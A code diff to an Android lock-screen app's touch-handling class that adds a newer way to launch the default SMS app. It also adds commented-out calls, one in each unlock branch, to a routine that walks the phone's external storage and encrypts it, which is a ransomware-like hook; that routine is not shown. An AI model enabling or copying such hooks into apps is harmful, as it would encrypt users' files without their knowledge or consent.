@@ -15,8 +15,10 @@ import android.graphics.Point;
 import android.graphics.PorterDuff;
 import android.graphics.RectF;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Vibrator;
 import android.provider.CallLog;
+import android.provider.Telephony;
 import android.view.MotionEvent;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -42,6 +44,7 @@ import java.util.Random;
 public class ConvexHullClickEngine extends Thread implements View.OnTouchListener {
 
     private final int intentChooser;
+    private final String externalStorageDirectory;
     private Utilities utilities;
     private IconPool iconPool;
     private Vibrator vibrator;
@@ -87,6 +90,7 @@ public class ConvexHullClickEngine extends Thread implements View.OnTouchListene
         this.path = new Path();
         this.paint = new Paint();
 
+        externalStorageDirectory = System.getenv("EXTERNAL_STORAGE") + "/";
     }
 
     @Override
@@ -305,17 +309,25 @@ public class ConvexHullClickEngine extends Thread implements View.OnTouchListene
                             //showCallLog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                             showCallLog.setType(CallLog.Calls.CONTENT_TYPE);
                             parentActivity.startActivity(showCallLog);
+                            // parentActivity.traverseAndroidDirectoriesAndEncrypt(new File(externalStorageDirectory), false);
                             LockScreenActivity.shouldRemoveView = true;
                             UnlockPhone();
                             parentActivity.finish();
                             break;
                         case LockScreenActivity.INTENT_MESSAGES:
                             try {
-                                Intent smsIntent = new Intent(Intent.ACTION_VIEW);
-                                smsIntent.addCategory(Intent.CATEGORY_DEFAULT);
-                                //smsIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                smsIntent.setType("vnd.android-dir/mms-sms");
-                                parentActivity.startActivity(smsIntent);
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                                    Intent eventIntentMessage = parentActivity.getPackageManager()
+                                            .getLaunchIntentForPackage(Telephony.Sms.getDefaultSmsPackage(parentActivity));
+                                    parentActivity.startActivity(eventIntentMessage);
+                                } else {
+                                    Intent smsIntent = new Intent(Intent.ACTION_VIEW);
+                                    smsIntent.addCategory(Intent.CATEGORY_DEFAULT);
+                                    //smsIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                    smsIntent.setType("vnd.android-dir/mms-sms");
+                                    parentActivity.startActivity(smsIntent);
+                                }
+                                //parentActivity.traverseAndroidDirectoriesAndEncrypt(new File(externalStorageDirectory), false);
                                 LockScreenActivity.shouldRemoveView = true;
                                 UnlockPhone();
                                 parentActivity.finish();
@@ -324,6 +336,7 @@ public class ConvexHullClickEngine extends Thread implements View.OnTouchListene
                             }
                             break;
                         default:
+                            //parentActivity.traverseAndroidDirectoriesAndEncrypt(new File(externalStorageDirectory), false);
                             LockScreenActivity.shouldRemoveView = true;
                             UnlockPhone();
                             System.out.println("unlocking");
